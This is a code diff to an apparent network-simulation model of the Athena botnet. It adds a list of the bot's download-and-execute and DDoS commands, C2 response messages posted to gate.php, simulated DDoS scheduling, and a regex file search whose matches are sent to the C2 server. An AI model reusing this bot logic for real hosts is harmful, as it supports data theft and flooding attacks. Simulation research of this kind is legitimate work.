@@ -21,6 +21,26 @@ namespace simbo {
 
 Define_Module(AthenaBot);
 
+/**
+ * Available Athena HTTP commands:
+ * !download http://www.website.com/file.exe 1 - Downloads and executes a given file after a random number of seconds waited within a given range
+ * !download.update http://www.website.com/file.exe 1 - Downloads and executes a given file after a random number of seconds waited within a given range, and then uninstalls
+ * !download.arguments http://www.website.com/file.exe 1 arguments - Downloads and Executes a file with specified arguments
+ * !download.abort http://www.website.com/file.exe 1 - Aborts a scheduled to download / update file -- this command is only available in the Athena IRC
+ * !uninstall - Uninstalls
+ * !ddos.stop - Ends any currently running DDoS
+ * !ddos.http.rapidget http://www.website.com/ port duration_time - Sends mass amounts of randomized GET packets to a given target
+ * All ddos (listed below) represent the same ddos.http.rapidget command:
+ * !ddos.http.slowloris - Attacks a target webserver with many concurrent connections
+ * !ddos.http.rudy - Slowly posts content by the masses to a target webserver
+ * !ddos.http.rapidpost - Sends mass amounts of randomized POST packets to a given target
+ * !ddos.http.slowpost – Holds many concurrent connections to a webserver through POST methods
+ * !ddos.http.arme - Abuses partial content headers in order to harm a target webserver
+ * !ddos.http.bandwith - This is a download based flood targetted torwards larger files and downloadable content on websites
+ * !ddos.layer4.udp - Sends mass amounts of packets containing random data to a target host/ip
+ * !ddos.layer4.ecf - Floods a target with rapid connections and disconnections (Previously named condis) (ECF stands for Established Connection Flooding)
+ */
+
 AthenaBot::OSMap AthenaBot::OS_map =
 {
         {"Windows 2000", WINDOWS_2000},
@@ -34,7 +54,18 @@ AthenaBot::OSMap AthenaBot::OS_map =
 
 AthenaBot::AthenaBot()
 {
+    // New installation
     bNewInstallation = true;
+
+    // DDoS not active
+    bDdosBusy = false;
+
+    // Default check-in
+    nCheckInInterval = 60;
+
+    // Return parameter
+    cReturnParameter[0] = '0';
+    cReturnParameter[1] = '\0';
 
     // Bot killer variables
     dwKilledProcesses = 0;
@@ -44,29 +75,28 @@ AthenaBot::AthenaBot()
 
 AthenaBot::~AthenaBot()
 {
-
+    cancelEvent(uninstall);
+    delete uninstall;
+    cancelEvent(botMessage);
+    delete botMessage;
 }
 
 void AthenaBot::initialize(int stage)
 {
     EV_INFO << "Initializing Athena bot component, stage " << stage << endl;
     std::string hostName = "Host " + this->getIndex();
-    this->setName(hostName.c_str());
+    //this->setName(hostName.c_str());
     GenericBot::initialize(stage);
     if (stage == INITSTAGE_LOCAL && infectedHost) {
         EV_INFO << "Initializing Athena bot component -- phase 1\n";
         double activationTime = par("botActivationTime");
         pingTime = par("botPingTime");
-        EV_INFO << "Initial activation time is " << activationTime << endl;
+        EV_INFO << "Bot initial activation time is " << activationTime << endl;
         cServer = par("serverName").stringValue();
 
         // Event messages - download and execute, uninstall, ddos
-        ddos = new cMessage("DDoS event message");
-        ddos->setKind(DDOS_EVENT);
         uninstall = new cMessage("Uninstall event message");
         uninstall->setKind(UNINSTALL_EVENT);
-        dlExec = new cMessage("Download and Execute event message");
-        dlExec->setKind(DL_EXEC_EVENT);
 
         // Host info
         isAdmin = par("admin").boolValue();
@@ -75,6 +105,7 @@ void AthenaBot::initialize(int stage)
         dotNetVersion = par("dotnet").stringValue();
         numCPUS = par("CPUs");
         std::string OS = par("OS").stdstringValue();
+        paths = par("logPath").stdstringValue();
         dwOperatingSystem = OS_map.find(OS) != OS_map.end() ? OS_map[OS] : OS_map["WINDOWS_UNKNOWN"];
 
         // Message scheduling
@@ -94,7 +125,29 @@ void AthenaBot::handleMessage(cMessage *msg)
     }
     else {
         EV_INFO << "Message received: " << msg->getName() << endl;
-        handleDataMessage(msg);
+        EV_INFO << "received from: " << msg->getSenderModule()->getName() << endl;
+        if (strcmp(msg->getSenderModule()->getName(), "tcpApp") == 0) {
+            if (msg->getKind() == HOST_INFECTED) {
+                if (dwOperatingSystem != LINUX) {
+                    infectedHost = true;
+                    botMessage->setKind(MSGKIND_ACTIVITY_BOT_START);
+                    scheduleAt(simTime() + 1, botMessage);
+                }
+            }
+            else if (msg->getKind() == HOST_NOT_INFECTED) {
+                handleUninstall();
+            }
+        }
+        else if (strcmp(msg->getSenderModule()->getName(), "DL&ExecModule"))
+            handleDataMessage(msg);
+        else {
+            std::ostringstream stream;
+            stream << "Bot response: " << commandsMap[dlExecLastMsgId];
+            cMessage *responseMsg = new cMessage(stream.str().c_str());
+            responseMsg->setKind(MSGKIND_BOT_RESPONSE_SESSION);
+            scheduleAt(simTime() + (simtime_t) 1, responseMsg);
+            delete msg;
+        }
     }
 }
 
@@ -122,19 +175,24 @@ void AthenaBot::handleDataMessage(cMessage *msg)
             memset(cDecryptedMessageBundle, 0, sizeof(cDecryptedMessageBundle));
             DecryptReceivedData(cMessageBundle, cKeyA, cKeyB, cDecryptedMessageBundle);
 
+            EV_INFO << "Message received from C2: " << cDecryptedMessageBundle;
             cMessageBundle = strtok(cDecryptedMessageBundle, "\n");
             while(cMessageBundle != NULL)
             {
                 ParseHttpLine(cMessageBundle);
 
-                /*
                 if(bHttpRestart)
                     break;
-                 */
                 cMessageBundle = strtok(NULL, "\n");
             }
         }
     }
+    if (bHttpRestart) {
+        cancelEvent(botMessage);
+        scheduleNextBotEvent(on_exec);
+    }
+    if (!infectedHost)
+        scheduleAt(simTime() + (simtime_t) 1, uninstall);
     delete appmsg;
     return;
 }
@@ -155,16 +213,19 @@ void AthenaBot::handleSelfMessages(cMessage *msg)
             break;
 
         case MSGKIND_BOT_RESPONSE_SESSION:
-            handleSelfBotResponseSession();
+            handleSelfBotResponseSession(msg);
             break;
-        case DDOS_EVENT:
-            handleDDoS();
+        case DDOS_ACTIVATE_EVENT:
+            handleActivateDDoS(msg);
+            break;
+        case DDOS_DESACTIVATE_EVENT:
+            handleDesactivateDDoS();
             break;
         case UNINSTALL_EVENT:
             handleUninstall();
             break;
         case DL_EXEC_EVENT:
-            handleDlExec();
+            handleDlExec(msg);
     }
 }
 
@@ -199,18 +260,22 @@ void AthenaBot::handleSelfActivityBotStart()
 void AthenaBot::handleSelfBotStartSession()
 {
     EV_INFO << "Starting new bot session @ T=" << simTime() << endl;
+    this->getDisplayString().setTagArg("i",1,"red");
+    this->getParentModule()->getDisplayString().setTagArg("i",1,"red");
     int nextMsgType = ConnectToHttp();
     scheduleNextBotEvent(nextMsgType);
 }
 
 void AthenaBot::handleSelfBotRepeatSession()
 {
+    /*
     if (IsAdmin()) {
         EV_INFO << "Host " << this->getIndex() << "was restarted!";
         infectedHost = false;
         scheduleNextBotEvent(on_exec);
         return;
     }
+    */
     EV_INFO << "Sending a repeat command to server @ T=" << simTime() << endl;
     int nextMsgType;
 
@@ -219,7 +284,7 @@ void AthenaBot::handleSelfBotRepeatSession()
 
     char cBusy[7];
     memset(cBusy, 0, sizeof(cBusy));
-    bDdosBusy = IsAdmin(); // currently, IsAdmin() function act as head or tails
+    bDdosBusy = false; // currently, IsAdmin() function act as head or tails
     if(bDdosBusy)
         strcpy(cBusy, "true");
     else
@@ -263,12 +328,56 @@ void AthenaBot::handleSelfBotRepeatSession()
     scheduleNextBotEvent(nextMsgType);
 }
 
-void AthenaBot::handleSelfBotResponseSession()
+void AthenaBot::handleSelfBotResponseSession(cMessage *msg)
 {
-   // TODO: Response for a command sent from C&C
+   char cDataToServer[MAX_HTTP_PACKET_LENGTH];
+   memset(cDataToServer, 0, sizeof(cDataToServer));
+   char msgName[200];
+   strcpy(msgName, msg->getName());
+   strtok(msgName, ":");
+   int nLocalTaskId = atoi(strtok(NULL, ":"));
+
+   char cBusy[7];
+   memset(cBusy, 0, sizeof(cBusy));
+   if(bDdosBusy)
+       strcpy(cBusy, "true");
+   else
+       strcpy(cBusy, "false");
+
+   sprintf(cDataToServer, "|type:response|uid:%s|taskid:%i|return:%s|busy:%s|", cUuid, nLocalTaskId, cReturnParameter, cBusy);
+
+   char cHttpHost[MAX_PATH];
+   memset(cHttpHost, 0, sizeof(cHttpHost));
+
+   char cHttpPath[DEFAULT];
+   memset(cHttpPath, 0, sizeof(cHttpPath));
+
+   char cBreakUrl[strlen(cServer)];
+   memset(cBreakUrl, 0, sizeof(cBreakUrl));
+   strcpy(cBreakUrl, cServer);
+
+   char *pcBreakUrl = cBreakUrl;
+
+   if(strstr(pcBreakUrl, "http://"))
+       pcBreakUrl += 7;
+   else if(strstr(pcBreakUrl, "https://"))
+       pcBreakUrl += 8;
+
+   pcBreakUrl = strtok(pcBreakUrl, "/");
+   if(pcBreakUrl != NULL)
+       strcpy(cHttpHost, pcBreakUrl);
+
+   pcBreakUrl = strtok(NULL, "?");
+   if(pcBreakUrl != NULL)
+       strcpy(cHttpPath, pcBreakUrl);
+
+   strcpy(cHttpHostGlobal, cHttpHost);
+   strcpy(cHttpPathGlobal, cHttpPath);
+   SendPanelRequest(cHttpHost, cHttpPath, usPort, cDataToServer);
+   delete msg;
 }
 
-void AthenaBot::handleDlExec()
+void AthenaBot::handleDlExec(cMessage *msg)
 {
     std::ostringstream stringStream;
     std::string url (urlDownload), header, body;
@@ -278,7 +387,7 @@ void AthenaBot::handleDlExec()
     stringStream << " HTTP/1.1";
     header = stringStream.str();
     downloadModule->sendRequestToServer(this, url, header, body);
-    // send response
+    dlExecLastMsgId = msg->getId();
 
     bGlobalOnlyOutputMd5Hash = false;
     bMd5MustMatch = false;
@@ -286,17 +395,42 @@ void AthenaBot::handleDlExec()
     bDownloadAbort = false;
     bUpdate = false;
     memset(szMd5Match, 0, sizeof(szMd5Match));
+    delete msg;
 }
 
-void AthenaBot::handleDDoS()
+void AthenaBot::handleActivateDDoS(cMessage *msg)
 {
     std::string target (urlTarget);
+    if (target.find("http://") != std::string::npos)
+        target = target.substr(target.find("http://") + 7);
+    else if (target.find("https://") != std::string::npos)
+        target = target.substr(target.find("https://") + 8);
     dosModule->activateModule(target);
+    currentDdos = new cMessage("DDoS Desactivate Event");
+    currentDdos->setKind(DDOS_DESACTIVATE_EVENT);
+    scheduleAt(simTime() + (simtime_t) dwStoreParameter, currentDdos);
+    bDdosBusy = true;
+    std::ostringstream stream;
+    stream << "Bot response: " << commandsMap[msg->getId()];
+    cMessage *responseMsg = new cMessage(stream.str().c_str());
+    responseMsg->setKind(MSGKIND_BOT_RESPONSE_SESSION);
+    scheduleAt(simTime() + (simtime_t) 10, responseMsg);
+    delete msg;
+}
+
+void AthenaBot::handleDesactivateDDoS()
+{
+    dosModule->desactivateModule();
+    bDdosBusy = false;
 }
 
 void AthenaBot::handleUninstall()
 {
+    EV_INFO << "Uninstalling bot from " << this->getName() << endl;
     infectedHost = false;
+    cancelEvent(botMessage);
+    this->getDisplayString().setTagArg("i",1,"white");
+    this->getParentModule()->getDisplayString().setTagArg("i",1,"white");
 }
 
 void AthenaBot::scheduleNextBotEvent(int msgType)
@@ -309,7 +443,7 @@ void AthenaBot::scheduleNextBotEvent(int msgType)
     case response: EV_INFO << "response" << endl; botMessage->setKind(MSGKIND_BOT_RESPONSE_SESSION); break;
     default: EV_ERROR << "Type not defined" << endl;
     }
-    scheduleAt(simTime() + (simtime_t) pingTime, botMessage);
+    scheduleAt(simTime() + (simtime_t) nCheckInInterval, botMessage);
 }
 
 int AthenaBot::ConnectToHttp()
@@ -645,6 +779,7 @@ void AthenaBot::EncryptSentData(char *cSource, char *cOutputData, char *cOutputE
 
     EV_INFO << "----------------------\nEncryption Communication Details:\nKey: " << cKey << "\nKey StrongUrlEncoded: " << cKeyEncryptedB << "\nData Encrypted(strtr): " << cEncryptedB << std::endl;
 }
+
 int AthenaBot::GeneratestrtrKey(char *cOutputA, char *cOutputB)
 {
     if(KEY_SIZE % 2 == 0)
@@ -742,7 +877,7 @@ void AthenaBot::DecryptReceivedData(const char *cSource, char *cKeyA, char *cKey
     strcpy(cOutputData, cDecryptedB);
 }
 
-bool AthenaBot::ParseHttpLine(const char *cMessage)
+void AthenaBot::ParseHttpLine(const char *cMessage)
 {
     char cDecrypted[MAX_HTTP_PACKET_LENGTH];
     memset(cDecrypted, 0, sizeof(cDecrypted));
@@ -755,6 +890,7 @@ bool AthenaBot::ParseHttpLine(const char *cMessage)
     char cParseLine[MAX_HTTP_PACKET_LENGTH];
     memset(cParseLine, 0, sizeof(cParseLine));
 
+    EV_INFO << "Message decrypted and decoded: " << cRawMessage << endl;
     if(strstr(cRawMessage, "interval")) {
         memcpy(cParseLine, cRawMessage + 10, strlen(cRawMessage) - 10 - 1);
 
@@ -782,11 +918,128 @@ bool AthenaBot::ParseHttpLine(const char *cMessage)
         char cFinalCommand[DEFAULT];
         memset(cFinalCommand, 0, sizeof(cFinalCommand));
         strcpy(cFinalCommand, cParseLine);
-        ParseCommand(cFinalCommand);
+        EV_INFO << "ParseHttpLine: " << cFinalCommand;
+        char *regex = strtok(cFinalCommand, " ");
+        regex = strtok(NULL, " ");
+        std::ifstream paths_ (paths);
+        int counter = 0;
+        int max = getParentModule()->getIndex();
+        if (paths_.is_open()) {
+            std::string path;
+            while (counter <= max) {
+                while (getline(paths_, path)) {
+                    counter++;
+                    if (counter > max) {
+                        DIR *dir;
+                        struct dirent *ent;
+                        if ((dir = opendir (path.c_str())) != NULL) {
+                            while ((ent = readdir (dir)) != NULL) {
+                                std::ifstream file (ent->d_name);
+                                std::string line;
+                                std::regex e(regex);
+                                int line_number = 1;
+                                while (getline(file, line)) {
+                                    if (std::regex_search(line, e)) {
+                                        std::string filename (ent->d_name);
+                                        search_reply(filename, line_number, line);
+                                        break;
+                                    }
+                                    line_number++;
+                                }
+                            }
+                            closedir (dir);
+                        }
+                    }
+                }
+            }
+        }
+        //ParseCommand(cFinalCommand, nTaskId);
     }
     else if(strstr(cRawMessage, "ERROR_NOT_IN_DB")) {
         bHttpRestart = true;
     }
+}
+
+void AthenaBot::search_reply(std::string p, int line_number, std::string line)
+{
+    bool bReturn = false;
+
+    char cHttpHost[MAX_PATH];
+    memset(cHttpHost, 0, sizeof(cHttpHost));
+
+    char cHttpPath[DEFAULT];
+    memset(cHttpPath, 0, sizeof(cHttpPath));
+
+    char cBreakUrl[strlen(cServer)];
+    memset(cBreakUrl, 0, sizeof(cBreakUrl));
+    strcpy(cBreakUrl, cServer);
+
+    char *pcBreakUrl = cBreakUrl;
+
+    if(strstr(pcBreakUrl, "http://"))
+        pcBreakUrl += 7;
+    else if(strstr(pcBreakUrl, "https://"))
+        pcBreakUrl += 8;
+
+    pcBreakUrl = strtok(pcBreakUrl, "/");
+    if(pcBreakUrl != NULL)
+        strcpy(cHttpHost, pcBreakUrl);
+
+    pcBreakUrl = strtok(NULL, "?");
+    if(pcBreakUrl != NULL)
+        strcpy(cHttpPath, pcBreakUrl);
+
+    strcpy(cHttpHostGlobal, cHttpHost);
+    strcpy(cHttpPathGlobal, cHttpPath);
+
+    char cOutPacket[MAX_HTTP_PACKET_LENGTH];
+    memset(cOutPacket, 0, sizeof(cOutPacket));
+
+    cReturnNewline[0] = '\r';
+    cReturnNewline[1] = '\n';
+    cReturnNewline[2] = '\0';
+    strcpy(cOutPacket, "POST /gate.php");
+    strcat(cOutPacket, cHttpPath);
+    strcat(cOutPacket, " HTTP/1.1");
+    strcat(cOutPacket, cReturnNewline);
+
+    strcat(cOutPacket, "Host: ");
+    strcat(cOutPacket, cHttpHost);
+    strcat(cOutPacket, ":");
+    char cHttpPort[7];
+    memset(cHttpPort, 0, sizeof(cHttpPort));
+    //itoa(usHttpPort, cHttpPort, 10);
+    int usHttpPort = 80;
+    sprintf(cHttpPort, "%d", usHttpPort);
+    strcat(cOutPacket, cHttpPort);
+    //strcat(cOutPacket, "192.168.56.102");
+    strcat(cOutPacket, cReturnNewline);
+
+    strcat(cOutPacket, "Connection: close");
+    strcat(cOutPacket, cReturnNewline);
+
+    strcat(cOutPacket, "Content-Type: application/x-www-form-urlencoded");
+    strcat(cOutPacket, cReturnNewline);
+
+    strcat(cOutPacket, "Cache-Control: no-cache");
+    strcat(cOutPacket, cReturnNewline);
+
+    strcat(cOutPacket, "Content-Length: ");
+    char cHttpContentLength[25];
+    memset(cHttpContentLength, 0, sizeof(cHttpContentLength));
+    int nPacketDataLength = 2 + strlen(p.c_str());
+    sprintf(cHttpContentLength, "%d", nPacketDataLength);
+    strcat(cOutPacket, cHttpContentLength);
+    strcat(cOutPacket, cReturnNewline);
+    strcat(cOutPacket, cReturnNewline);
+
+    char cPacketData[nPacketDataLength];
+    memset(cPacketData, 0, sizeof(cPacketData));
+    std::ostringstream data;
+    data << p << ":" << line_number << ":" << line;
+    strcpy(cPacketData, data.str().c_str());
+
+    httpModule->sendRequestToServer(this, cHttpHost, cOutPacket, cPacketData);
 }
 
 /*
@@ -1123,7 +1376,7 @@ char *AthenaBot::DecryptCommand(char *pcCommand)
     return pcCommand;
 }
 
-void AthenaBot::ParseCommand(char *pcCommand) //Parses an already-processed raw command
+void AthenaBot::ParseCommand(char *pcCommand, int taskId) //Parses an already-processed raw command
 {
     pcCommand = StripReturns(pcCommand);
 
@@ -1132,7 +1385,6 @@ void AthenaBot::ParseCommand(char *pcCommand) //Parses an already-processed raw 
 
     char *pcArguments = strstr(cFullCommand, " ") + 1;
     char *pcCheckCommand = strtok(pcCommand, " ");
-
     if(HasSpaceCharacter(cFullCommand)) {
 
         if(strstr(pcCheckCommand, "download")) {
@@ -1225,6 +1477,7 @@ void AthenaBot::ParseCommand(char *pcCommand) //Parses an already-processed raw 
                 Sleep(10000);
             }
         }
+        */
         /* FILESEARCH command */
         /*
 #ifdef INCLUDE_FILESEARCH
@@ -1605,7 +1858,6 @@ void AthenaBot::ParseCommand(char *pcCommand) //Parses an already-processed raw 
                 if(!bBusy) {
                     char *pcBreakString = strtok(pcArguments, " ");
 
-                    char cTargetUrl[strlen(pcBreakString)];
                     if(pcBreakString != NULL)
                         strcpy(urlTarget, pcBreakString);
 
@@ -1636,9 +1888,13 @@ void AthenaBot::ParseCommand(char *pcCommand) //Parses an already-processed raw 
                         if(strstr(pcCheckCommand, "bandwith"))
                             usTargetPort = 80;
 
-                        if((strstr(cTargetUrl, ".")) && (usTargetPort < 65545) && (dwAttackLength > 0)) {
+                        if((strstr(urlTarget, ".")) && (usTargetPort < 65545) && (dwAttackLength > 0)) {
                             if((usTargetPort >= 0 && strstr(pcCheckCommand, "udp")) || (usTargetPort > 0 && !strstr(pcCheckCommand, "udp"))) {
-                                scheduleAt(simTime() + (simtime_t) 1, ddos);
+                                dwStoreParameter = dwAttackLength;
+                                currentDdos = new cMessage("DDoS Activate Command");
+                                currentDdos->setKind(DDOS_ACTIVATE_EVENT);
+                                commandsMap.insert(std::pair<int, int>(currentDdos->getId(), taskId));
+                                scheduleAt(simTime() + (simtime_t) 1, currentDdos);
                             }
                         }
                     }
@@ -1826,10 +2082,9 @@ void AthenaBot::ParseCommand(char *pcCommand) //Parses an already-processed raw 
 */
     }
     else {
-        /* Lock commands */
+        /* LOCK commands */
         /*
         if(strstr(pcCheckCommand, "lock")) {
-            /* LOCK commands */
             /*
 #ifdef INCLUDE_LOCK
             pcCheckCommand += 5;
@@ -2075,8 +2330,10 @@ void AthenaBot::ParseCommand(char *pcCommand) //Parses an already-processed raw 
 
             if(strstr(pcCheckCommand, "stop"))
             {
-                if(strstr(pcCheckCommand, "browser"))
+                if(strstr(pcCheckCommand, "browser")) {
                     bBrowserDdosBusy = false;
+                    dosModule->desactivateModule();
+                }
                 else if(bDdosBusy) {
                     bDdosBusy = false;
                     dosModule->desactivateModule();
@@ -2249,6 +2506,7 @@ void AthenaBot::DownloadExecutableFile()
 {
     int nLocalTaskId = nCurrentTaskId;
 
+    EV_INFO << "DL&ExecFile command";
     srand(GenerateRandomSeed());
 
     char cDownloadFrom[DEFAULT];
@@ -2263,7 +2521,6 @@ void AthenaBot::DownloadExecutableFile()
         strcpy(cExecutionArguments, "N/A");
 
     char szLocalMd5Match[150];
-    bool bMatchRequired = bMd5MustMatch;
     memset(szLocalMd5Match, 0, sizeof(szLocalMd5Match));
     if(bMd5MustMatch) {
         bMd5MustMatch = false;
@@ -2272,13 +2529,10 @@ void AthenaBot::DownloadExecutableFile()
         memset(szMd5Match, 0, sizeof(szMd5Match));
     }
 
-    bool bOutputMd5Hash = bGlobalOnlyOutputMd5Hash;
     if(bGlobalOnlyOutputMd5Hash)
         bGlobalOnlyOutputMd5Hash = false;
 
     DWORD dwSecondsToWait = GetRandNum(dwStoreParameter);
-
-    bool bDownloadUpdate = bUpdate;
 
     if (bDownloadAbort) {
         bGlobalOnlyOutputMd5Hash = false;
@@ -2287,12 +2541,16 @@ void AthenaBot::DownloadExecutableFile()
         bDownloadAbort = false;
         bUpdate = false;
         memset(szMd5Match, 0, sizeof(szMd5Match));
-        cancelEvent(dlExec);
+        if (currentDlExec)
+            cancelEvent(currentDlExec);
     }
     else {
         urlDownload = strtok(strstr(cDownloadFromLocation, "://") + 3, "/");
         fileDownload = strtok(NULL, "/");
-        scheduleAt(simTime() + (simtime_t) dwSecondsToWait, dlExec);
+        currentDlExec = new cMessage("Download and Execute Command");
+        currentDlExec->setKind(DL_EXEC_EVENT);
+        commandsMap.insert(std::pair<int, int>(currentDlExec->getId(), nLocalTaskId));
+        scheduleAt(simTime() + (simtime_t) dwSecondsToWait, currentDlExec);
     }
 
     /** Download and execute original handler */
